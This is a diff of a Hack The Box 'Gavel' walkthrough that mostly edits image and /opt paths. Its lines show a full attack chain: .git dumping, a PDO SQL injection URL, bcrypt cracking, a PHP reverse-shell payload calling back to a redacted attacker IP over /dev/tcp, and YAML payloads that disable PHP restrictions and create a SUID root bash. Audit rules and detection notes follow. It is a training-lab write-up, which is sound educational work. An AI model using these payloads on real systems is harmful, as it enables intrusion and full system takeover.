@@ -19,11 +19,11 @@ Hints: True
 | 7 | `www-data` | **Reverse Shell & Pivot** | Triggered rule execution via `bid_handler.php` to get a shell. Stabilized shell and used password reuse (`midXXXXXX`) to `su auctioneer`. |
 | 8 | `auctioneer` | **Local Enumeration** | Discovered `/usr/local/bin/gavel-util` which processes YAML files using PHP `runkit` with root privileges. |
 | 9 | `auctioneer` | **PHP Config Injection (YAML)** | Submitted malicious YAML via `gavel-util` to overwrite `php.ini` and remove `open_basedir`/`disable_functions`. |
-| 10 | `auctioneer` | **SUID Binary Creation (YAML)** | Submitted second YAML payload to copy `/bin/bash` to `/opt/gavel/rootbash` and set the SUID bit (`chmod u+s`). |
-| 11 | `root` | **Privilege Escalation** | Executed `/opt/gavel/rootbash -p` to gain root access and retrieve the `/root/root.txt` flag. |
+| 10 | `auctioneer` | **SUID Binary Creation (YAML)** | Submitted second YAML payload to copy `/bin/bash` to `/opt/rootbash` and set the SUID bit (`chmod u+s`). |
+| 11 | `root` | **Privilege Escalation** | Executed `/opt/rootbash -p` to gain root access and retrieve the `/root/root.txt` flag. |
 
 
-![Gavel](Gavel/HTB_2025-12-21_18-44MindMap.png)
+![Gavel](HTB_2025-12-21_18-44MindMap.png)
 
 
 ## Reconnaissance
@@ -36,7 +36,7 @@ Traditionally, we begin with an Nmap scan and discover two open TCP ports: port 
 nmap  -sC -sV -oN nmap_scan.txt 10.129.4.66
 ```
 
-![Gavel](Gavel/HTB_2025-12-21_18-44_nmap_scan.png)
+![Gavel](HTB_2025-12-21_18-44_nmap_scan.png)
 
 
 SSH is unlikely to be useful at this stage without credentials, so we'll focus our attention on exploring the web application as the most promising entry point.
@@ -65,14 +65,14 @@ Finally, we open a browser and after adding the domain, we can see the full-feat
 http://gavel.htb
 ```
 
-![Gavel](Gavel/HTB_2025-12-21_18-44_Web.png)
+![Gavel](HTB_2025-12-21_18-44_Web.png)
 
 
 We're presented with a fantasy-themed auction web platform offering various virtual goods. The site implements full user registration functionality and a bidding system. From a **pentesting** perspective, this immediately points to potential **attack vectors**: `SQL` injections in login forms and filters, manipulation of `bid parameters`, and vulnerabilities in `transaction processing logic`. Any system where users submit numeric values (`bid amounts`, `lot IDs`) deserves close attention.
 
 
 
-![Gavel](Gavel/HTB_2025-12-21_18-44_Webreg.png)
+![Gavel](HTB_2025-12-21_18-44_Webreg.png)
 
 
 Obviously, for further exploration, we need to register — most functionality is hidden behind authentication, and without an account, we won't be able to interact with the bidding and auction system. Let's create a test account and log in.
@@ -99,7 +99,7 @@ ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt \
 - `/inventory.php` — inventory of goods
 - `/.git/` — **exposed Git repository!** (This is a serious finding)
 
-![Gavel](Gavel/HTB_2025-12-21_18-58_gitexposed.png)
+![Gavel](HTB_2025-12-21_18-58_gitexposed.png)
 
 ### Extracting Source Code from Git Repository
 
@@ -109,7 +109,7 @@ Since we've found a goldmine, we'll use the specialized tool `git-dumper` to ext
 git-dumper http://gavel.htb/.git/ ./gavel-source
 ```
 
-![Gavel](Gavel/HTB_2025-12-21_19-10_gitdumper.png)
+![Gavel](HTB_2025-12-21_19-10_gitdumper.png)
 
 Now we have full access to the application's source code — this significantly simplifies vulnerability discovery. I think when analyzing the code, we should focus on critical files: `admin.php`, `inventory.php`, `login.php`, and the `includes/` directory. We also pay special attention to: SQL queries, configuration files, authentication logic, and user data processing.
 
@@ -134,7 +134,7 @@ http://gavel.htb/inventory.php?user_id=x`+FROM+(SELECT+group_concat(username,0x3
 ```
 
 
-![Gavel](Gavel/HTB_2025-12-21_18-44_Web_SQLIn.png)
+![Gavel](HTB_2025-12-21_18-44_Web_SQLIn.png)
 
 
 Key points for bypassing PDO:
@@ -165,19 +165,19 @@ john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 **Result:** - Password: midXXXXXX
 
 
-![Gavel](Gavel/HTB_2025-12-21_18-44_auctcred_hashcrack.png)
+![Gavel](HTB_2025-12-21_18-44_auctcred_hashcrack.png)
 
 ### Logging into Admin Panel
 
 Now for the most interesting part — we go to the admin panel and use the credentials we already have (login and password - `auctioneer:midXXXXXX`)
 
 
-![Gavel](Gavel/HTB_2025-12-21_18-44_Webadminlogin.png)
+![Gavel](HTB_2025-12-21_18-44_Webadminlogin.png)
 
 And what do we see: as an administrator, we have infinite local coins with which we can simply buy out the entire auction and live happily. I admit, I couldn't resist and spent a couple of minutes buying all the lots and my inner collector was satisfied! But, as we remember, we're interested in something completely different — we're not here for virtual trophies, but for complete control over the system.
 
 
-![Gavel](Gavel/HTB_2025-12-21_18-44_Webadminloginpage.png)
+![Gavel](HTB_2025-12-21_18-44_Webadminloginpage.png)
 
 
 
@@ -223,7 +223,7 @@ In the rule field, we insert the following PHP code:
 system('bash -c "bash -i >& /dev/tcp/XX:XX:XX:XX/4444 0>&1"'); return true;
 ```
 
-![Gavel](Gavel/HTB_2025-12-21_18-44_Webrevshell.png)
+![Gavel](HTB_2025-12-21_18-44_Webrevshell.png)
 
 
 Now we trigger the execution of our payload. Open a new terminal (netcat should continue listening in the first one) and send a POST request to the bid handler:
@@ -235,7 +235,7 @@ curl -X POST 'http://gavel.htb/includes/bid_handler.php' \
      -d 'auction_id=1&bid_amount=50000'
 ```
 
-![Gavel](Gavel/HTB_2025-12-21_18-44_auctionid.png)
+![Gavel](HTB_2025-12-21_18-44_auctionid.png)
 
 
 At this very moment, when we entered our payload, the server checks the rules for the lot, our code is executed, a reverse connection to netcat is initiated, and at this moment we should receive a shell.
@@ -243,7 +243,7 @@ At this very moment, when we entered our payload, the server checks the rules fo
 Also, it's very important not to forget to change auction_id to the current one and cookie to your session. Lots may have different or identical lifetimes, so keep this in mind — it's important.
 
 
-![Gavel](Gavel/HTB_2025-12-21_18-44_bid.png)
+![Gavel](HTB_2025-12-21_18-44_bid.png)
 
 
 ### Shell Stabilization and Switching to auctioneer User
@@ -255,11 +255,11 @@ After getting the reverse shell, we find ourselves in a "raw" environment as `ww
 This is a so-called "dumb" shell — tab completion doesn't work, up/down arrows don't scroll through command history, and `Ctrl+C` will simply kill the connection. First, we stabilize the shell through Python:
 
 ```
-www-data@gavel:/var/www/html/gavel/includes$ python3 -c 'import pty; pty.spawn("/bin/bash")'
-www-data@gavel:/var/www/html/gavel/includes$
+www-data@gavel:/var/www/html/includes$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+www-data@gavel:/var/www/html/includes$
 ```
 
-![Gavel](Gavel/HTB_2025-12-21_18-44_webshellpng.png)
+![Gavel](HTB_2025-12-21_18-44_webshellpng.png)
 
 
 The `pty` module creates a pseudo-terminal that emulates a real TTY. Now the shell thinks it's working in a full-featured terminal — tab completion appears and commands work correctly.
@@ -271,13 +271,13 @@ Currently, we're working as user `www-data` — this is a service account under 
 We're very lucky and it turns out that user `auctioneer` uses the same password for both the web application and the system account. We don't waste time and switch:
 
 ```
-www-data@gavel:/var/www/html/gavel/includes$ su auctioneer
+www-data@gavel:/var/www/html/includes$ su auctioneer
 Password: midXXXXXX
-auctioneer@gavel:/var/www/html/gavel/includes$ cd /home/auctioneer
+auctioneer@gavel:/var/www/html/includes$ cd /home/auctioneer
 auctioneer@gavel:~$
 ```
 
-![Gavel](Gavel/HTB_2025-12-21_18-44actionerrshell.png)
+![Gavel](HTB_2025-12-21_18-44actionerrshell.png)
 
 
 
@@ -297,7 +297,7 @@ We successfully retrieve the flag!
 cat /home/auctioneer/user.txt
 ```
 
-![Gavel](Gavel/HTB_2025-12-21_18-44userflag.png)
+![Gavel](HTB_2025-12-21_18-44userflag.png)
 
 
 ## Privilege Escalation to Root
@@ -307,14 +307,14 @@ cat /home/auctioneer/user.txt
 Now begins the privilege escalation phase. We explore the system for interesting files and utilities:
 
 ```bash
-auctioneer@gavel:~$ ls -la /opt/gavel/
+auctioneer@gavel:~$ ls -la /opt/
 auctioneer@gavel:~$ ls -la /usr/local/bin/
 ```
 
 When exploring the system, we discover the `gavel-util` utility in `/usr/local/bin/`. This utility allows sending YAML files with descriptions of auction items. The key point: the `rule` field in YAML is processed by the same `runkit_function_add()` mechanism we used to get the reverse shell, but now the code executes with elevated privileges!
 
 
-![Gavel](Gavel/HTB_2025-12-21_18-44sysfiles.png)
+![Gavel](HTB_2025-12-21_18-44sysfiles.png)
 
 
 ### YAML Injection — Two-Stage Attack
@@ -331,7 +331,7 @@ auctioneer@gavel:~$ echo 'description: fix php ini' >> fix_ini.yaml
 auctioneer@gavel:~$ echo 'image: "x.png"' >> fix_ini.yaml
 auctioneer@gavel:~$ echo 'price: 1' >> fix_ini.yaml
 auctioneer@gavel:~$ echo 'rule_msg: "fixini"' >> fix_ini.yaml
-auctioneer@gavel:~$ echo "rule: file_put_contents('/opt/gavel/.config/php/php.ini', \"engine=On\\ndisplay_errors=On\\nopen_basedir=\\ndisable_functions=\\n\"); return false;" >> fix_ini.yaml
+auctioneer@gavel:~$ echo "rule: file_put_contents('/opt/.config/php/php.ini', \"engine=On\\ndisplay_errors=On\\nopen_basedir=\\ndisable_functions=\\n\"); return false;" >> fix_ini.yaml
 ```
 
 Submit the file for processing:
@@ -341,7 +341,7 @@ auctioneer@gavel:~$ /usr/local/bin/gavel-util submit /home/auctioneer/fix_ini.ya
 Item submitted for review in next auction
 ```
 
-![Gavel](Gavel/HTB_2025-12-21_18-44disbledphprestrictions.png)
+![Gavel](HTB_2025-12-21_18-44disbledphprestrictions.png)
 
 
 > **Important:** Wait a few seconds while the system processes the YAML and executes the code from the `rule` field.
@@ -356,7 +356,7 @@ auctioneer@gavel:~$ echo 'description: make suid bash' >> rootshell.yaml
 auctioneer@gavel:~$ echo 'image: "x.png"' >> rootshell.yaml
 auctioneer@gavel:~$ echo 'price: 1' >> rootshell.yaml
 auctioneer@gavel:~$ echo 'rule_msg: "rootshell"' >> rootshell.yaml
-auctioneer@gavel:~$ echo "rule: system('cp /bin/bash /opt/gavel/rootbash; chmod u+s /opt/gavel/rootbash'); return false;" >> rootshell.yaml
+auctioneer@gavel:~$ echo "rule: system('cp /bin/bash /opt/rootbash; chmod u+s /opt/rootbash'); return false;" >> rootshell.yaml
 ```
 
 Submit for execution:
@@ -366,7 +366,7 @@ auctioneer@gavel:~$ /usr/local/bin/gavel-util submit /home/auctioneer/rootshell.
 Item submitted for review in next auction
 ```
 
-![Gavel](Gavel/HTB_2025-12-21_18-44SUIDbashcreation.png)
+![Gavel](HTB_2025-12-21_18-44SUIDbashcreation.png)
 
 
 ### Obtaining ROOT Privileges
@@ -374,11 +374,11 @@ Item submitted for review in next auction
 After processing the second YAML file, we check if the SUID file was created:
 
 ```bash
-auctioneer@gavel:~$ ls -l /opt/gavel/rootbash
--rwsr-xr-x 1 root root 1396520 Dec  5 20:26 /opt/gavel/rootbash
+auctioneer@gavel:~$ ls -l /opt/rootbash
+-rwsr-xr-x 1 root root 1396520 Dec  5 20:26 /opt/rootbash
 ```
 
-![Gavel](Gavel/HTB_2025-12-21_18-44Ssupermrootpng.png)
+![Gavel](HTB_2025-12-21_18-44Ssupermrootpng.png)
 
 
 Excellent! We see the `s` flag in the permissions (`-rwsr-xr-x`) — this means the SUID bit is set. Now any user who runs this file will get the owner's (root) privileges.
@@ -386,7 +386,7 @@ Excellent! We see the `s` flag in the permissions (`-rwsr-xr-x`) — this means 
 We run rootbash with the `-p` flag (preserve privileges) to maintain elevated privileges:
 
 ```bash
-auctioneer@gavel:~$ /opt/gavel/rootbash -p
+auctioneer@gavel:~$ /opt/rootbash -p
 rootbash-5.1# whoami
 root
 ```
@@ -399,7 +399,7 @@ XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
 ```
 
 
-![Gavel](Gavel/HTB_2025-12-21_18-44SRoot_flag.png)
+![Gavel](HTB_2025-12-21_18-44SRoot_flag.png)
 
 
 
@@ -461,7 +461,7 @@ XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
 * **Toxic Combinations** –  
   * Admin session cookie (`PHPSESSID`) combined with rule injection payload → triggers RCE during scheduled lot updates.  
   * `www‑data` shell + reused password → `su auctioneer`.  
-  * `auctioneer` user executing YAML that writes to `/opt/gavel/.config/php/php.ini` and copies `/bin/bash` → SUID escalation.
+  * `auctioneer` user executing YAML that writes to `/opt/.config/php/php.ini` and copies `/bin/bash` → SUID escalation.
 
 
 
@@ -472,7 +472,7 @@ XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
   * **Audit Rules** to monitor:  
     - `auditctl -a always,exit -F arch=b64 -S execve -k php_exec` (captures `runkit_function_add()` calls).  
     - `auditctl -w /usr/local/bin/gavel-util -p x -k yaml_exec`.  
-    - `auditctl -w /opt/gavel/.config/php/php.ini -p w -k ini_mod`.  
+    - `auditctl -w /opt/.config/php/php.ini -p w -k ini_mod`.  
   * **Syslog**: Monitor `/var/log/apache2/access.log` for HTTP requests containing backticks or `%00`.
 
 * **Detection-as-Code (KQL)** – Example for Azure Sentinel:
@@ -520,7 +520,7 @@ Heartbeat
 * **Post-Exploitation** –  
   * `hashcat` for hash cracking (bcrypt mode).  
   * `gavel-util` for YAML injection; no additional exploits needed.  
-  * `chmod u+s /opt/gavel/rootbash` to create SUID binary.
+  * `chmod u+s /opt/rootbash` to create SUID binary.
 
 
 
@@ -550,9 +550,9 @@ Heartbeat
 | **07** | Trigger rule via bid handler | `curl -X POST http://gavel.htb/includes/bid_handler.php -H 'Cookie: PHPSESSID=<cookie>' -d 'auction_id=1&bid_amount=50000'` |
 | **08** | Stabilize shell | `python3 -c 'import pty; pty.spawn(\"/bin/bash\")'` |
 | **09** | Switch to auctioneer | `su auctioneer` (password: midXXXXXX) |
-| **10** | Disable PHP sandbox via YAML | `cat > fix_ini.yaml <<EOF\nname: fixini\ndescription: fix php ini\nimage: \"x.png\"\nprice: 1\nrule_msg: \"fixini\"\nrule: file_put_contents('/opt/gavel/.config/php/php.ini', \"engine=On\\ndisplay_errors=On\\nopen_basedir=\\ndisable_functions=\\n\"); return false;\nEOF`<br>`/usr/local/bin/gavel-util submit fix_ini.yaml` |
-| **11** | Create SUID bash via YAML | `cat > rootshell.yaml <<EOF\nname: rootshell\ndescription: make suid bash\nimage: \"x.png\"\nprice: 1\nrule_msg: \"rootshell\"\nrule: system('cp /bin/bash /opt/gavel/rootbash; chmod u+s /opt/gavel/rootbash'); return false;\nEOF`<br>`/usr/local/bin/gavel-util submit rootshell.yaml` |
-| **12** | Execute SUID binary | `/opt/gavel/rootbash -p` |
+| **10** | Disable PHP sandbox via YAML | `cat > fix_ini.yaml <<EOF\nname: fixini\ndescription: fix php ini\nimage: \"x.png\"\nprice: 1\nrule_msg: \"fixini\"\nrule: file_put_contents('/opt/.config/php/php.ini', \"engine=On\\ndisplay_errors=On\\nopen_basedir=\\ndisable_functions=\\n\"); return false;\nEOF`<br>`/usr/local/bin/gavel-util submit fix_ini.yaml` |
+| **11** | Create SUID bash via YAML | `cat > rootshell.yaml <<EOF\nname: rootshell\ndescription: make suid bash\nimage: \"x.png\"\nprice: 1\nrule_msg: \"rootshell\"\nrule: system('cp /bin/bash /opt/rootbash; chmod u+s /opt/rootbash'); return false;\nEOF`<br>`/usr/local/bin/gavel-util submit rootshell.yaml` |
+| **12** | Execute SUID binary | `/opt/rootbash -p` |
 | **13** | Retrieve root flag | `cat /root/root.txt` |
 
 
